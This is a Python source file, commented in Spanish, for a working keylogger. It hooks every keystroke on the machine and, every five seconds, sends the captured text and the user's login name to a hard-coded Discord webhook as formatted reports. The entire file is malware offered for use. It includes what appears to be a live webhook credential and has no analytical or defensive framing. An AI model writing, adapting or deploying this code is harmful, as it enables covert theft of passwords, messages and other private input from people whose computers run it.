import keyboard
import time
import requests
import threading
import os
from datetime import datetime

# TU WEBHOOK DE DISCORD - REEMPLAZA CON EL TUYO
WEBHOOK_URL = 'https://discord.com/api/webhooks/1321168295369379890/kKZ5NjCX17zxab4VHDy_5ixSPAVbDTguoeWpCkpkPdFiQVvghky4s2EkW1YtUF3lPbve'

# Lista para almacenar las teclas capturadas
keylogs = []
log_lock = threading.Lock()  # Para evitar problemas entre hilos
running = True
username = os.getlogin()
start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# Función para formatear teclas especiales correctamente
def format_key(key_name):
    special_keys = {
        'space': ' ',
        'enter': '\n[ENTER]\n',
        'backspace': '[⌫]',
        'tab': '[TAB] ',
        'shift': '',
        'shift_r': '',
        'ctrl': '',
        'ctrl_r': '',
        'alt': '',
        'alt_r': '',
        'caps lock': '[CAPS]',
        'esc': '[ESC]',
        'delete': '[DEL]',
        'page up': '[PG UP]',
        'page down': '[PG DN]',
        'home': '[HOME]',
        'end': '[END]',
        'insert': '[INS]',
        'print screen': '[PSC]',
        'scroll lock': '[SCRL]',
        'pause': '[PAUSE]',
        'num lock': '[NUM]',
        'up': '[↑]',
        'down': '[↓]',
        'left': '[←]',
        'right': '[→]',
        'decimal': '.',
        # Teclas de función
        'f1': '[F1]',
        'f2': '[F2]',
        'f3': '[F3]',
        'f4': '[F4]',
        'f5': '[F5]',
        'f6': '[F6]',
        'f7': '[F7]',
        'f8': '[F8]',
        'f9': '[F9]',
        'f10': '[F10]',
        'f11': '[F11]',
        'f12': '[F12]',
        # Teclas especiales comunes
        '`': '`',
        '~': '~',
        '!': '!',
        '@': '@',
        '#': '#',
        '$': '$',
        '%': '%',
        '^': '^',
        '&': '&',
        '*': '*',
        '(': '(',
        ')': ')',
        '-': '-',
        '_': '_',
        '=': '=',
        '+': '+',
        '[': '[',
        ']': ']',
        '{': '{',
        '}': '}',
        '\\': '\\',
        '|': '|',
        ';': ';',
        ':': ':',
        "'": "'",
        '"': '"',
        ',': ',',
        '<': '<',
        '.': '.',
        '>': '>',
        '/': '/',
        '?': '?',
    }
    
    # Si es una tecla especial conocida, devolver su valor formateado
    if key_name.lower() in special_keys:
        return special_keys[key_name.lower()]
    
    # Si es una sola letra o número, devolverla tal cual
    if len(key_name) == 1:
        return key_name
    
    # Para otras teclas, mostrar entre corchetes
    return f'[{key_name.upper()}]'

# Función para enviar logs a Discord
def send_keylogs():
    global keylogs, running
    
    if not running:
        return
    
    # Obtener logs de forma segura
    with log_lock:
        if not keylogs:
            # Si no hay logs, programar siguiente envío y salir
            if running:
                threading.Timer(5, send_keylogs).start()
            return
        
        current_logs = keylogs.copy()
        keylogs.clear()  # Limpiar después de copiar
    
    try:
        # Crear mensaje formateado
        timestamp = datetime.now().strftime("%H:%M:%S")
        date_str = datetime.now().strftime("%d/%m/%Y")
        
        # Convertir lista a string
        logs_text = ''.join(current_logs)
        
        # Si el texto está vacío después de filtrar, salir
        if not logs_text.strip():
            if running:
                threading.Timer(5, send_keylogs).start()
            return
        
        # Limitar tamaño si es muy largo (Discord tiene límite de 2000 chars)
        if len(logs_text) > 1500:
            logs_text = logs_text[:1500] + "\n...[TRUNCADO]"
        
        # Crear payload para Discord con formato embellecido
        embed = {
            "title": "🔑 Keylogger Report",
            "description": f"```{logs_text}```",
            "color": 0x00ff00,
            "fields": [
                {
                    "name": "👤 Usuario",
                    "value": username,
                    "inline": True
                },
                {
                    "name": "⏰ Hora",
                    "value": timestamp,
                    "inline": True
                },
                {
                    "name": "📅 Fecha",
                    "value": date_str,
                    "inline": True
                },
                {
                    "name": "📊 Teclas capturadas",
                    "value": str(len(current_logs)),
                    "inline": False
                }
            ],
            "footer": {
                "text": f"Inicio: {start_time} | Envía cada: 5 segundos"
            },
            "timestamp": datetime.now().isoformat()
        }
        
        payload = {
            "embeds": [embed],
            "username": f"Keylogger - {username}",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/3067/3067256.png"
        }
        
        # Enviar a Discord
        headers = {'Content-Type': 'application/json'}
        response = requests.post(WEBHOOK_URL, json=payload, headers=headers, timeout=10)
        
        if response.status_code in [200, 204]:
            print(f"[{timestamp}] ✅ Enviadas {len(current_logs)} teclas a Discord")
        else:
            print(f"[{timestamp}] ❌ Error {response.status_code}")
            # Si hay error, volver a agregar los logs
            with log_lock:
                keylogs = current_logs + keylogs
    
    except Exception as e:
        error_time = datetime.now().strftime("%H:%M:%S")
        print(f"[{error_time}] ❌ Error de conexión: {str(e)[:50]}")
        # Si hay error, volver a agregar los logs
        with log_lock:
            keylogs = current_logs + keylogs
    
    # Programar próximo envío en 5 segundos
    if running:
        threading.Timer(5, send_keylogs).start()

# Función para capturar teclas
def capture_keystrokes(event):
    global keylogs
    
    if not running:
        return
    
    try:
        key_name = event.name
        formatted_key = format_key(key_name)
        
        # Solo agregar si no está vacío (algunas teclas como shift se filtran)
        if formatted_key:
            with log_lock:
                keylogs.append(formatted_key)
                
                # Limitar memoria (últimas 10000 teclas)
                if len(keylogs) > 10000:
                    keylogs = keylogs[-10000:]
    
    except Exception as e:
        print(f"Error capturando tecla: {e}")

# Función para detener todo
def stop_program():
    global running
    print("\n⏹️  Deteniendo keylogger...")
    running = False
    
    # Enviar cualquier log restante
    with log_lock:
        if keylogs:
            send_keylogs()
    
    print("✅ Keylogger detenido. Presiona Ctrl+C para salir.")

# Configurar tecla para detener (F12)
def setup_stop_hotkey():
    def stop_on_f12(e):
        if e.name == 'f12' and e.event_type == 'down':
            stop_program()
            keyboard.unhook_all()
    
    keyboard.hook(stop_on_f12)

# Función principal
def main():
    print("=" * 60)
    print("🔑 KEYLOGGER ACTIVADO 🔑")
    print("=" * 60)
    print(f"Usuario: {username}")
    print(f"Hora inicio: {start_time}")
    print(f"Webhook: {WEBHOOK_URL[:50]}...")
    print("Intervalo de envío: 5 segundos")
    print("Para detener: Presiona F12")
    print("=" * 60)
    print("\n[STATUS] Capturando todas las teclas...")
    print("[STATUS] Revisa tu Discord cada 5 segundos")
    print("=" * 60 + "\n")
    
    # Configurar captura de teclas
    keyboard.on_release(callback=capture_keystrokes)
    
    # Configurar tecla para detener
    setup_stop_hotkey()
    
    # Iniciar envío periódico
    send_keylogs()
    
    # Mantener programa ejecutándose
    try:
        while running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        stop_program()
    
    print("\n👋 Programa finalizado")
    time.sleep(2)

# Punto de entrada
if __name__ == "__main__":
    # Verificar que el webhook no sea el ejemplo
    if 'your_webhook_url' in WEBHOOK_URL or not WEBHOOK_URL:
        print("❌ ERROR: Debes configurar tu webhook real")
        print("Reemplaza 'your_webhook_url' con tu webhook de Discord")
        print("\nPara obtener tu webhook:")
        print("1. Ve a tu servidor de Discord")
        print("2. Configuración del canal → Integraciones → Webhooks")
        print("3. Crea un nuevo webhook y copia la URL")
        input("\nPresiona Enter para salir...")
    else:
        main()